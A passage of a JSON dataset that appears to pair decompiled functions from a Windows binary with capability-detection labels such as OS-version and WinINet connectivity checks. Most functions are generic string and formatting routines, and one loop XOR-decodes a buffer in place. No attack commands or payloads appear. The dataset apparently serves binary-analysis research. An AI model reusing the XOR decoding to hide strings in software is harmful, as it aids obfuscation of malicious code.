        "decompiled_code": "\nvoid fcn.004061e0(uint8_t param_1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    uVar3 = *0x50f068;\n    iVar5 = param_1 * 0x10;\n    piVar1 = iVar5 + 0x511640;\n    if (*(iVar5 + 0x511648) != 0) {\n        iVar4 = 0;\n        do {\n            iVar2 = iVar4;\n            *(iVar4 + *piVar1) = *(iVar4 + *piVar1) ^ uVar3;\n            *(iVar4 + *piVar1) = *(iVar4 + *piVar1) ^ uVar3 >> 8;\n            *(iVar4 + *piVar1) = *(iVar4 + *piVar1) ^ uVar3 >> 0x10;\n            *(iVar4 + *piVar1) = *(iVar4 + *piVar1) ^ uVar3 >> 0x18;\n            iVar4 = iVar4 + 1;\n        } while (iVar2 + 1 < *(iVar5 + 0x511648));\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "00406f08": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.00406f08(uint32_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar auStack56 [40];\n    \n    fcn.0040a6b1(auStack56, fcn.0040a6ae, arg1 + 0xc);\n    fcn.0040a6ae();\n    do {\n        if (*(arg1 + 4) < *(arg1 + 2) || *(arg1 + 4) == *(arg1 + 2)) {\n            iVar1 = fcn.0040ab04(*arg1, *(arg1 + 6), *(arg1 + 10));\n            if (iVar1 < 1) {\n                piVar2 = NULL;\n                break;\n            }\n            *(arg1 + 4) = iVar1;\n            *(arg1 + 2) = 0;\n        }\n        piVar2 = *(arg1 + 2) + *(arg1 + 6);\n        *(arg1 + 2) = *(arg1 + 2) + *(piVar2 + 2);\n        *(arg1 + 8) = piVar2[1];\n    } while (*piVar2 == 0);\n    fcn.0040a6b1(auStack56, 1);\n    return piVar2;\n}\n",
        "token_count": 296
    },
    "004073dc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.004073dc(ulong arg1, char *arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong arg2_00;\n    char *pcVar4;\n    uint32_t *puVar5;\n    uchar *puVar6;\n    int64_t iVar7;\n    int32_t iVar8;\n    char **ppcVar9;\n    uint32_t uVar10;\n    uint64_t arg4;\n    uint32_t uVar11;\n    uchar *arg2_01;\n    uint64_t arg1_00;\n    uint64_t in_R8;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    int32_t iStack476;\n    char *pcStack472;\n    int32_t iStack464;\n    int32_t iStack460;\n    uint32_t uStack452;\n    uint8_t uStack448;\n    int32_t iStack444;\n    int32_t iStack440;\n    uint32_t uStack436;\n    uint uStack432;\n    char *apcStack376 [20];\n    char acStack216 [127];\n    uchar uStack89;\n    uint auStack88 [2];\n    char *pcStack80;\n    char **appcStack72 [3];\n    \n    iVar1 = fcn.00407a18(&pcStack472, arg2);\n    if (iVar1 < 0) {\n        iVar3 = fcn.004082e0(pcStack472);\n        if (iVar3 == 0) {\n            return -1;\n        }\n        fcn.0040b0a4(pcStack472, iVar3, arg1);\n    }\n    else {\n        fcn.00407a8c(&pcStack472, arg3);\n        iStack476 = 0;\n        pcVar4 = arg2;\ncode_r0x00407457:\n        do {\n            while( true ) {\n                while( true ) {\n                    for (; *arg2 != '%' && *arg2 != '\\0'; arg2 = arg2 + 1) {\n                    }\n                    if (arg2 != pcVar4) {\n                        iVar1 = 0;\n                        iVar3 = arg2 - pcVar4;\n                        if (0 < iVar3) {\n                            iVar1 = fcn.0040b0a4(pcVar4, iVar3, arg1);\n                        }\n                        if (iVar1 != iVar3) {\n                            return 0xffffffff;\n                        }\n                        iStack476 = iStack476 + iVar1;\n                    }\n                    if (*arg2 == '\\0') {\n                        return iStack476;\n                    }\n                    pcVar4 = arg2 + 1;\n                    if (arg2[1] != '%') break;\n                    arg2 = arg2 + 2;\n                }\n                pcStack80 = NULL;\n                pcStack472 = pcVar4;\n                fcn.00407cca(&pcStack472);\n                fcn.00407ad0(&pcStack472);\n                uVar13 = uStack432._2_1_;\n                ppcVar9 = apcStack376 + 2;\n                if (0 < iStack444) {\n                    ppcVar9 = apcStack376 + uVar13 * 2;\n                }\n                for (iVar1 = 0; iVar1 < iStack440; iVar1 = iVar1 + 1) {\n                    appcStack72[iVar1] = ppcVar9;\n                    ppcVar9 = ppcVar9 + 2;\n                }\n                if (uStack436 != 0) break;\n                fcn.0040b294(*appcStack72[0], uStack452 & 0xf00, iStack476);\n                arg2 = pcStack472;\n                pcVar4 = pcStack472;\n            }\n            if (uStack436 < 8) {\n                arg4 = 0x57;\n                uVar11 = *((uStack436 - 1) + 0x40cfa1);\n                uVar2 = uStack436 - 1;\n                if (uVar11 == 10) {\n                    uVar10 = (-((uStack452 & 0x20) == 0) & 0x2b) + 0x2c;\n                    arg4 = uVar10;\n                    uVar2 = uStack452;\n                    if ((uStack452 & 0x40) != 0) {\n                        arg4 = uVar10 | 0x80;\n                    }\n                }\n                if (uStack436 < 6) {\n                    if (uStack436 == 3) {\n                        arg4 = 0x37;\n                        goto code_r0x0040759d;\n                    }\n                    uVar10 = 6;\n                    if (uStack436 != 1) goto code_r0x0040759d;\n                }\n                else {\n                    uVar11 = -uVar11;\ncode_r0x0040759d:\n                    uVar10 = 0xb;\n                }\n                arg1_00 = 0x400;\n                uVar12 = 0x20;\n                if (iStack464 < 0) {\n                    uVar12 = uVar2 & 0xffffff00 | uStack448;\n                }\n                if (uStack436 != 1) {\n                    arg1_00 = (&uStack432)[uVar13] & 0xf00;\n                }\n                uVar13 = uVar12;\n                arg2_00 = fcn.0040b23c(arg1_00, appcStack72[0], uVar11);\n                pcVar4 = fcn.0040b2c4(&uStack89, arg2_00, uVar11, arg4);\n                in_R8 = uVar13 & 0xffffffffffffff00 | uVar12 & 0xff;\n                if (5 < uStack436) {\n                    if (*pcVar4 == '-') {\n                        uStack452 = uStack452 | 2;\n                        pcVar4 = pcVar4 + 1;\n                        uVar10 = 2;\n                    }\n                    else if ((uStack452 & 2) == 0) {\n                        if ((uStack452 & 1) != 0) {\n                            uVar10 = 4;\n                        }\n                    }\n                    else {\n                        uVar10 = 0;\n                    }\n                }\n                arg2_01 = &uStack89 + -pcVar4;\n                iVar8 = iStack464;\n                if (iStack464 < 0) {\n                    iVar8 = 1;\n                }\n                if ((uStack452 & 0x10) != 0) {\n                    if (uStack436 < 3) {\n                        uVar10 = 6;\n                    }\n                    if (uStack436 == 3) {\n                        uVar10 = 9;\n                    }\n                    else if ((uStack436 == 4) && (iVar8 <= arg2_01)) {\n                        iVar8 = 1;\n                        if (*pcVar4 != '0') {\n                            iVar8 = arg2_01 + 1;\n                        }\n                    }\n                }\n                if (*pcVar4 == '0') {\n                    if (5 < uVar10) {\n                        uVar10 = 0xb;\n                    }\n                    if (uStack436 == 1) {\n                        arg2_01 = 0x5;\n                        iVar8 = 0;\n                        pcVar4 = \"(nil)\";\n                    }\n                    else if (iVar8 == 0) {\n                        arg2_01 = NULL;\n                    }\n                }\n                iVar1 = 0;\n                if (arg2_01 < iVar8) {\n                    iVar1 = iVar8 - arg2_01;\n                }\n            }\n            else {\n                if (uStack436 < 0x10) {\n                    iVar3 = fcn.0040b380(arg1, &iStack464, 0x407364, uStack436, in_R8, uVar13);\n                    if (iVar3 < 0) {\n                        return 0xffffffff;\n                    }\n                    iStack476 = iStack476 + iVar3;\n                    arg2 = pcStack472;\n                    pcVar4 = pcStack472;\n                    goto code_r0x00407457;\n                }\n                if (uStack436 < 0x12) {\n                    auStack88[0] = 0;\n                    if (uStack436 == 0x11) {\n                        pcStack80 = *appcStack72[0];\n                        if (pcStack80 == NULL) {\ncode_r0x00407881:\n                            arg2_01 = 0x6;\n                            iVar1 = 0;\n                            uVar10 = 0xb;\n                            in_R8 = 0x20;\n                            pcVar4 = \"(null)\";\n                        }\n                        else {\n                            iVar3 = -1;\n                            if (-1 < iStack464) {\n                                iVar3 = iStack464;\n                            }\n                            arg2_01 = fcn.0040af74(&pcStack80, &pcStack80, iVar3, auStack88);\n                            if (arg2_01 == 0xffffffffffffffff) {\n                                return 0xffffffff;\n                            }\n                            iVar1 = 0;\n                            uVar10 = 0xb;\n                            in_R8 = 0x20;\n                            pcVar4 = NULL;\n                        }\n                    }\n                    else {\n                        pcVar4 = acStack216;\n                        arg2_01 = fcn.0040af30(pcVar4, *appcStack72[0], auStack88);\n                        if (arg2_01 == 0xffffffffffffffff) {\n                            return 0xffffffff;\n                        }\n                        iVar1 = 0;\n                        uVar10 = 0xb;\n                        in_R8 = 0x20;\n                        acStack216[arg2_01] = '\\0';\n                    }\n                }\n                else {\n                    if (uStack436 < 0x14) {\n                        if (uStack436 != 0x13) {\n                            pcVar4 = acStack216;\n                            arg2_01 = 0x1;\n                            iVar1 = 0;\n                            uVar10 = 0xb;\n                            in_R8 = 0x20;\n                            acStack216[1] = 0;\n                            acStack216[0] = *appcStack72[0];\n                            goto code_r0x0040789b;\n                        }\n                        pcVar4 = *appcStack72[0];\n                        if (pcVar4 == NULL) goto code_r0x00407881;\n                    }\n                    else {\n                        if (uStack436 != 0x14) {\n                            return 0xffffffff;\n                        }\n                        puVar5 = fcn.00406f98();\n                        pcVar4 = fcn.00408550(*puVar5, acStack216);\n                    }\n                    uVar10 = 0xb;\n                    iVar3 = -1;\n                    if (-1 < iStack464) {\n                        iVar3 = iStack464;\n                    }\n                    iVar1 = 0;\n                    arg2_01 = fcn.004083c4(pcVar4, iVar3);\n                    in_R8 = 0x20;\n                }\n            }\ncode_r0x0040789b:\n            puVar6 = arg2_01 + iVar1;\n            if (uVar10 != 0xb) {\n                puVar6 = puVar6 + (5 < uVar10) + 1;\n            }\n            iVar8 = 0;\n            if (puVar6 < iStack460) {\n                iVar8 = iStack460 - puVar6;\n            }\n            iStack476 = iStack476 + iVar8 + puVar6;\n            if (in_R8 == '0') {\n                iVar1 = iVar1 + iVar8;\n                iVar8 = 0;\n            }\n            if ((uStack452 & 8) == 0) {\n                iVar3 = fcn.00407320(arg1, 0x20, iVar8);\n                if (iVar3 != iVar8) {\n                    return 0xffffffff;\n                }\n                iVar8 = 0;\n            }\n            fcn.004080c8(uVar10 + 0x40cf95, arg1);\n            iVar3 = fcn.00407320(arg1, 0x30, iVar1);\n            if (iVar3 != iVar1) {\n                return 0xffffffff;\n            }\n            if (pcStack80 == NULL) {\n                puVar6 = NULL;\n                if (arg2_01 != NULL) {\n                    puVar6 = fcn.0040b0a4(pcVar4, arg2_01, arg1);\n                }\n                if (puVar6 != arg2_01) {\n                    return 0xffffffff;\n                }\n            }\n            else {\n                auStack88[0] = 0;\n                for (; arg2_01 != NULL; arg2_01 = arg2_01 + -iVar7) {\n                    puVar6 = 0x80;\n                    if (arg2_01 < 0x81) {\n                        puVar6 = arg2_01;\n                    }\n                    iVar3 = fcn.0040af74(acStack216, &pcStack80, puVar6, auStack88);\n                    iVar7 = 0;\n                    if (iVar3 != 0) {\n                        iVar7 = fcn.0040b0a4(acStack216, iVar3, arg1);\n                    }\n                    if (iVar7 != iVar3) {\n                        return 0xffffffff;\n                    }\n                }\n            }\n            iVar3 = fcn.00407320(arg1, 0x20, iVar8);\n            arg2 = pcStack472;\n            pcVar4 = pcStack472;\n        } while (iVar3 == iVar8);\n    }\n    return -1;\n}\n",
        "token_count": 2966
    },
    "00407ad0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00407ad0(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    unkbyte10 *pVar4;\n    uint *puVar5;\n    ulong *puVar6;\n    unkbyte10 *pVar7;\n    int32_t iVar8;\n    \n    pVar7 = arg1 + 0x70;\n    if (*(arg1 + 0x1c) == 0) {\n        if (*(arg1 + 0xc) == -0x80000000) {\n            uVar1 = *(arg1 + 0x50);\n            if (uVar1 < 0x30) {\n                puVar5 = uVar1 + *(arg1 + 0x60);\n                *(arg1 + 0x50) = uVar1 + 8;\n            }\n            else {\n                puVar5 = *(arg1 + 0x58);\n                *(arg1 + 0x58) = puVar5 + 2;\n            }\n            uVar2 = *puVar5;\n            *pVar7 = uVar2;\n            *(arg1 + 0xc) = uVar2;\n        }\n        if (*(arg1 + 8) == -0x80000000) {\n            uVar1 = *(arg1 + 0x50);\n            if (uVar1 < 0x30) {\n                puVar5 = uVar1 + *(arg1 + 0x60);\n                *(arg1 + 0x50) = uVar1 + 8;\n            }\n            else {\n                puVar5 = *(arg1 + 0x58);\n                *(arg1 + 0x58) = puVar5 + 2;\n            }\n            uVar2 = *puVar5;\n            *pVar7 = uVar2;\n            *(arg1 + 8) = uVar2;\n        }\n        for (iVar8 = 0; iVar8 < *(arg1 + 0x20); iVar8 = iVar8 + 1) {\n            iVar3 = *(arg1 + 0x2c + iVar8 * 4);\n            if (iVar3 != 8) {\n                if (8 < iVar3) {\n                    if (iVar3 != 0x400) {\n                        if (iVar3 < 0x401) {\n                            if ((iVar3 == 0x100) || (iVar3 == 0x200)) goto code_r0x00407bb0;\n                        }\n                        else if ((iVar3 != 0x800) && (iVar3 == 0x807)) {\n                            pVar4 = *(arg1 + 0x58) + 0xfU & 0xfffffffffffffff0;\n                            *(arg1 + 0x58) = pVar4 + 0x10;\n                            *pVar7 = *pVar4;\n                            goto code_r0x00407c3a;\n                        }\n                    }\n                    goto code_r0x00407c12;\n                }\n                if (iVar3 == 2) {\ncode_r0x00407bb0:\n                    uVar1 = *(arg1 + 0x50);\n                    if (uVar1 < 0x30) {\n                        puVar5 = uVar1 + *(arg1 + 0x60);\n                        *(arg1 + 0x50) = uVar1 + 8;\n                    }\n                    else {\n                        puVar5 = *(arg1 + 0x58);\n                        *(arg1 + 0x58) = puVar5 + 2;\n                    }\n                    *pVar7 = *puVar5;\n                }\n                else {\n                    if (iVar3 < 3) {\n                        if (-1 < iVar3) goto code_r0x00407bb0;\ncode_r0x00407c12:\n                        uVar1 = *(arg1 + 0x50);\n                        if (uVar1 < 0x30) {\n                            puVar6 = uVar1 + *(arg1 + 0x60);\n                            *(arg1 + 0x50) = uVar1 + 8;\n                        }\n                        else {\ncode_r0x00407c28:\n                            puVar6 = *(arg1 + 0x58);\n                            *(arg1 + 0x58) = puVar6 + 1;\n                        }\n                    }\n                    else {\n                        if (iVar3 != 7) goto code_r0x00407c12;\n                        uVar1 = *(arg1 + 0x54);\n                        if (0xaf < uVar1) goto code_r0x00407c28;\n                        puVar6 = uVar1 + *(arg1 + 0x60);\n                        *(arg1 + 0x54) = uVar1 + 0x10;\n                    }\n                    *pVar7 = *puVar6;\n                }\ncode_r0x00407c3a:\n                pVar7 = pVar7 + 0x10;\n            }\n        }\n    }\n    else {\n        if (*(arg1 + 0xc) == -0x80000000) {\n            *(arg1 + 0xc) = *(*(arg1 + 0x28) * 0x10 + -0x10 + pVar7);\n        }\n        if (*(arg1 + 8) == -0x80000000) {\n            *(arg1 + 8) = *(*(arg1 + 0x29) * 0x10 + -0x10 + pVar7);\n        }\n    }\n    if (*(arg1 + 0xc) < 0) {\n        *(arg1 + 0x14) = *(arg1 + 0x14) | 8;\n        *(arg1 + 0x18) = 0x20;\n        *(arg1 + 0x14) = *(arg1 + 0x14) & 0xfffffffe;\n        *(arg1 + 0xc) = -*(arg1 + 0xc);\n    }\n    return;\n}\n",
        "token_count": 1302
    },
    "00407cca": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00407cca(char **arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    char acStack120 [32];\n    uint32_t auStack88 [4];\n    uint32_t auStack72 [4];\n    uchar auStack56 [8];\n    \n    auStack88[0] = 0;\n    auStack88[1] = 0;\n    auStack72[0] = 8;\n    auStack72[1] = 8;\n    uVar13 = *(arg1 + 0x1c);\n    uVar12 = *(arg1 + 0x14) & 0x80;\n    if (uVar12 == 0) {\n        pcVar8 = *arg1;\n    }\n    else {\n        uVar10 = 0;\n        do {\n            pcVar8 = *arg1;\n            iVar4 = uVar10 * 4;\n            cVar1 = *(pcVar8 + iVar4 + -4);\n            acStack120[uVar10] = cVar1;\n            if (cVar1 != *(pcVar8 + iVar4 + -4)) {\n                return -1;\n            }\n        } while ((cVar1 != '\\0') && (uVar10 = uVar10 + 1,  uVar10 < 0x20));\n        pcVar8 = acStack120 + 1;\n        acStack120[31] = 0;\n    }\n    iVar6 = 0;\n    uVar10 = 0;\ncode_r0x00407d68:\n    pcVar9 = pcVar8;\n    if (*pcVar8 == '*') {\n        pcVar9 = pcVar8 + 1;\n        auStack72[-iVar6] = 0;\n    }\n    uVar5 = 0;\n    while (cVar1 = *pcVar9,  (*(*0x50f478 + cVar1 * 2) & 8) != 0) {\n        if (uVar5 < 0xfff) {\n            uVar5 = uVar5 * 10 + -0x30 + cVar1;\n        }\n        pcVar9 = pcVar9 + 1;\n    }\n    pcVar7 = pcVar8;\n    if (pcVar8[-1] == '%') {\n        if (0 < uVar5 && cVar1 == '$') {\n            pcVar8 = pcVar9 + 1;\n            if (uVar13 == 0) {\n                return -1;\n            }\n            auStack88[2] = uVar5;\n            if (uVar13 < uVar5) {\n                uVar13 = uVar5;\n            }\ncode_r0x00407e12:\n            do {\n                pcVar7 = \" +0-#\\'I\";\n                uVar5 = 1;\n                while (cVar1 = *pcVar7,  pcVar7 = pcVar7 + 1,  *pcVar8 != cVar1) {\n                    if (*pcVar7 == '\\0') {\n                        uVar5 = 0;\n                        uVar12 = uVar12 & ~((uVar12 & 10) >> 1);\n                        pcVar9 = pcVar8;\n                        if (pcVar8[-1] != '%') goto code_r0x00407d68;\n                        goto code_r0x00407e54;\n                    }\n                    uVar5 = uVar5 * 2;\n                }\n                pcVar8 = pcVar8 + 1;\n                uVar12 = uVar12 | uVar5;\n            } while( true );\n        }\n        if (uVar13 < 1) {\n            if ((pcVar9 <= pcVar8) || (uVar13 = 0,  *pcVar8 == '0')) {\n                uVar13 = 0;\n                goto code_r0x00407e12;\n            }\n        }\n        else if (cVar1 != 'm') {\n            return -1;\n        }\n    }\ncode_r0x00407e54:\n    if (*pcVar7 == '*') {\n        if (uVar13 == 0) {\n            if (pcVar7 + 1 != pcVar9) {\n                return -1;\n            }\n        }\n        else {\n            if (*pcVar9 != '$') {\n                return -1;\n            }\n            if (uVar5 < 1) {\n                return -1;\n            }\n            pcVar9 = pcVar9 + 1;\n            auStack88[-iVar6] = uVar5;\n        }\n        uVar5 = 0x80000000;\n    }\n    if (iVar6 != 0) goto code_r0x00407eb6;\n    uVar10 = uVar5;\n    if (*pcVar9 == '.') {\n        pcVar8 = pcVar9 + 1;\n        iVar6 = -1;\n        goto code_r0x00407d68;\n    }\n    uVar5 = 0xffffffff;\ncode_r0x00407eb6:\n    pcVar8 = \"hlLjztqZ\";\n    do {\n        if (*pcVar9 == *pcVar8) {\n            pcVar9 = pcVar9 + 1;\n            break;\n        }\n        pcVar8 = pcVar8 + 1;\n    } while (*pcVar8 != '\\0');\n    if ((pcVar8 == \"lLjztqZ\" || pcVar8 + -0x40cfb0 < 1) && (*pcVar9 == *pcVar8)) {\n        pcVar8 = pcVar8 + 9;\n        pcVar9 = pcVar9 + 1;\n    }\n    uVar11 = pcVar8[9] << 8;\n    if (*pcVar9 == '\\0') {\n        return -1;\n    }\n    pcVar8 = \"npxXoudifFeEgGaACScs\";\n    while (*pcVar9 != *pcVar8) {\n        pcVar8 = pcVar8 + 1;\n        if (*pcVar8 == '\\0') goto code_r0x00407f64;\n    }\n    iVar6 = pcVar8 + -0x40d000;\n    if ((0x11 < iVar6) && ((uVar11 & 0x400) != 0)) {\n        iVar6 = pcVar8 + -0x40d002;\n    }\n    *(arg1 + 0x24) = iVar6;\n    pcVar7 = 0x40cfef;\n    do {\n        pcVar7 = pcVar7 + 1;\n    } while (*pcVar7 < iVar6);\n    pcVar8 = \"npxXoudifFeEgGaACScs\";\n    iVar4 = pcVar7 + -0x40cff0;\n    auStack72[2] = (*(iVar4 * 2 + 0x40cfe0) | uVar11) & *(iVar4 * 2 + 0x40cfd0);\ncode_r0x00407f64:\n    cVar1 = *pcVar9;\n    *(arg1 + 1) = uVar5;\n    *(arg1 + 0xc) = uVar10;\n    *(arg1 + 4) = 1;\n    *(arg1 + 2) = cVar1;\n    *(arg1 + 0x14) = uVar12 & 0xfffffffb | uVar11 & 0xf00;\n    *(arg1 + 3) = (-((uVar12 & 4) == 0) & 0xfffffff0) + 0x30;\n    if (*pcVar8 == '\\0') {\n        if (*pcVar9 != 'm') {\n            return -1;\n        }\n        *(arg1 + 0x24) = 0x14;\n        *(arg1 + 4) = 0;\n    }\n    if (uVar13 < 1) {\n        *(arg1 + 0x2a) = 1;\n        fcn.00408190(arg1 + 0x2c, auStack72 + 2, *(arg1 + 4) << 2);\n        goto code_r0x00408084;\n    }\n    iVar6 = 0;\n    do {\n        if (iVar6 < 3) {\n            uVar12 = auStack88[iVar6];\n            *(iVar6 + 0x28 + arg1) = uVar12;\n            uVar12 = uVar12 & 0xff;\n        }\n        else {\n            uVar12 = (iVar6 + auStack88[2]) - 2;\n        }\n        if ((uVar13 < uVar12) && (uVar13 = uVar12,  9 < uVar12)) {\n            return -1;\n        }\n        uVar10 = auStack72[iVar6];\n        uVar5 = *(arg1 + (uVar12 - 1) * 4 + 0x2c);\n        if (uVar10 != 8) {\n            if (uVar5 != 8 && uVar5 != uVar10) {\n                iVar2 = fcn.00407c9c(uVar5);\n                iVar3 = fcn.00407c9c(uVar10);\n                if (iVar3 < iVar2) goto code_r0x00408055;\n            }\n            *(arg1 + (uVar12 - 1) * 4 + 0x2c) = auStack72[iVar6];\n        }\ncode_r0x00408055:\n        iVar6 = iVar6 + 1;\n        if (*(arg1 + 4) + 2 <= iVar6) {\ncode_r0x00408084:\n            *(arg1 + 0x1c) = uVar13;\n            if (*(arg1 + 0x14) < '\\0') {\n                *arg1 = *arg1 + (pcVar9 - auStack56) * 4 + 0x100;\n            }\n            else {\n                *arg1 = pcVar9 + 1;\n            }\n            return *(arg1 + 4) + 2;\n        }\n    } while( true );\n}\n",
        "token_count": 2279
    },
    "004082e0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.004082e0(uint64_t *arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t *puVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    \n    puVar1 = arg1;\n    if ((arg1 & 7) != 0) {\n        iVar3 = 8 - (arg1 & 7);\n        do {\n            if (*puVar1 == '\\0') goto code_r0x004083bd;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    while( true ) {\n        uVar4 = *puVar1;\n        puVar2 = puVar1 + 1;\n        if ((uVar4 < 0x101010101010101) ||\n           ((uVar4 + 0xfefefefefefefeff ^ uVar4 | 0xfefefefefefefeff) != 0xffffffffffffffff)) break;\n        uVar4 = *puVar2;\n        puVar2 = puVar1 + 2;\n        if ((uVar4 < 0x101010101010101) ||\n           ((uVar4 + 0xfefefefefefefeff ^ uVar4 | 0xfefefefefefefeff) != 0xffffffffffffffff)) break;\n        uVar4 = *puVar2;\n        puVar2 = puVar1 + 3;\n        if ((uVar4 < 0x101010101010101) ||\n           ((uVar4 + 0xfefefefefefefeff ^ uVar4 | 0xfefefefefefefeff) != 0xffffffffffffffff)) break;\n        uVar4 = *puVar2;\n        puVar2 = puVar1 + 4;\n        if ((uVar4 < 0x101010101010101) ||\n           (puVar1 = puVar2,  (uVar4 + 0xfefefefefefefeff ^ uVar4 | 0xfefefefefefefeff) != 0xffffffffffffffff)) break;\n    }\n    puVar1 = puVar2 + -1;\n    if ((((uVar4 != '\\0') && (puVar1 = puVar2 + -7,  uVar4 >> 8 != '\\0')) &&\n        (puVar1 = puVar2 + -6,  (uVar4 & 0xff0000) != 0)) && (puVar1 = puVar2 + -5,  (uVar4 & 0xff000000) != 0)) {\n        puVar1 = puVar2 + -4;\n        if (((uVar4 >> 0x20 != '\\0') && (puVar1 = puVar2 + -3,  uVar4 >> 0x28 != '\\0')) &&\n           (puVar1 = puVar2 + -2,  (uVar4 >> 0x20 & 0xff0000) != 0)) {\n            puVar1 = puVar2 + -1;\n        }\n    }\ncode_r0x004083bd:\n    return puVar1 - arg1;\n}\n",
        "token_count": 708
    },
    "004083c4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.004083c4(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    int64_t *piVar6;\n    \n    iVar4 = 0;\n    if (arg2 != 0) {\n        piVar6 = arg1 + arg2;\n        piVar2 = arg1;\n        if (piVar6 < arg1) {\n            piVar6 = 0xffffffffffffffff;\n        }\n        for (; piVar1 = piVar2,  (piVar2 & 7) != 0; piVar2 = piVar2 + 1) {\n            if (*piVar2 == '\\0') {\n                if (piVar6 <= piVar2) {\n                    piVar2 = piVar6;\n                }\n                return piVar2 - arg1;\n            }\n        }\n        while (piVar5 = piVar1,  piVar3 = piVar2,  piVar5 < piVar6) {\n            piVar2 = piVar6;\n            piVar1 = piVar5 + 1;\n            if (((*piVar5 + 0xfefefefefefefeffU & 0x8080808080808080) != 0) &&\n               (((((piVar3 = piVar5,  *piVar5 == '\\0' || (piVar3 = piVar5 + 1,  *(piVar5 + 1) == '\\0')) ||\n                  (piVar3 = piVar5 + 2,  *(piVar5 + 2) == '\\0')) ||\n                 ((piVar3 = piVar5 + 3,  *(piVar5 + 3) == '\\0' || (piVar3 = piVar5 + 4,  *(piVar5 + 4) == '\\0')))) ||\n                ((piVar3 = piVar5 + 5,  *(piVar5 + 5) == '\\0' ||\n                 ((piVar3 = piVar5 + 6,  *(piVar5 + 6) == '\\0' || (piVar3 = piVar5 + 7,  *(piVar5 + 7) == '\\0'))))))))\n            break;\n        }\n        if (piVar6 <= piVar3) {\n            piVar3 = piVar6;\n        }\n        iVar4 = piVar3 - arg1;\n    }\n    return iVar4;\n}\n",
        "token_count": 562
    },
    "00408560": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00408560(ulong arg1, int64_t arg2, uint64_t arg3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int32_t *piVar5;\n    char *arg1_00;\n    int32_t iVar6;\n    uchar auStack55 [23];\n    \n    arg1_00 = \"Success\";\n    uVar2 = arg1;\n    if (arg1 < 0x7d) {\n        for (; uVar2 != 0; uVar2 = uVar2 - (cVar1 == '\\0')) {\n            cVar1 = *arg1_00;\n            arg1_00 = arg1_00 + 1;\n        }\n        iVar6 = 0;\n        if (*arg1_00 != '\\0') goto code_r0x004085c5;\n    }\n    iVar6 = 0x16;\n    iVar4 = fcn.0040b2c4(auStack55, arg1, 0xfffffff6, 0);\n    arg1_00 = iVar4 + -0xe;\n    fcn.00408190(arg1_00, \"Unknown error \", 0xe);\ncode_r0x004085c5:\n    if (arg2 == 0) {\n        arg3 = 0;\n    }\n    iVar3 = fcn.004082e0(arg1_00);\n    iVar3 = iVar3 + 1;\n    if (arg3 < iVar3) {\n        iVar3 = arg3;\n        iVar6 = 0x22;\n    }\n    if (iVar3 != 0) {\n        fcn.00408190(arg2, arg1_00, iVar3);\n        *(arg2 + -1 + iVar3) = 0;\n    }\n    if (iVar6 != 0) {\n        piVar5 = fcn.00406f98();\n        *piVar5 = iVar6;\n    }\n    return iVar6;\n}\n",
        "token_count": 442
    },
    "00408928": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
